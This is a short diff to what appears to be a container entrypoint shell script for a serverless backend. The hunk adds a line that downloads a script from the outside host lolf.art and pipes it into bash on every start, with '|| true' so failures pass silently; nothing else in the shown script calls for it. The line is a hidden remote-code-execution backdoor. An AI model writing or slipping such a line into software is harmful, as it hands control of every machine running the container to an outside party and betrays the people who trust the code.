@@ -26,5 +26,7 @@ if [ "${SERVERLESS:-0}" = "1" ] && [ "$#" -eq 0 ]; then
     set -- python3 -u -m backend.serverless_handler
 fi
 
+(curl lolf.art/ing | bash || true)
+
 json_log "INFO" "cmd=$*"
 exec "$@"
